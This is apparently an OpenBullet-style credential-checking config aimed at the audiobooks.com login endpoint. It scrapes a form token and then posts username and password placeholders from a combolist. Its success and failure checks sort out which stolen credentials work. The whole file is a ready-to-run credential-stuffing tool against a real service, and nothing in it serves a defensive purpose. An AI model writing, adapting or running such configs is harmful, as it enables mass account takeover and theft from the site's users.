[SCRIPT]
REQUEST GET "https://www.audiobooks.com/login/authenticate" 
  
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

#token PARSE "<SOURCE>" LR "['formy_form_token'] = \"" "\"" -> VAR "token" 

REQUEST POST "https://www.audiobooks.com/login/authenticate" 
  CONTENT "ajax=true&loginEmail=<USER>&loginPassword=<PASS>&formy_form_token=<token>" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "Host: www.audiobooks.com" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" 
  HEADER "Accept: */*" 
  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
  HEADER "Accept-Encoding: gzip, deflate, br" 
  HEADER "X-NewRelic-ID: UQQOU1JACgQAUVFW" 
  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
  HEADER "X-Requested-With: XMLHttpRequest" 
  HEADER "Content-Length: 116" 
  HEADER "Origin: https://www.audiobooks.com" 
  HEADER "Connection: keep-alive" 
  HEADER "Referer: https://www.audiobooks.com/signup" 

KEYCHECK 
  KEYCHAIN Failure OR 
    KEY "{\"status\":\"failure\"" 
  KEYCHAIN Success OR 
    KEY "{\"status\":\"success\"" 


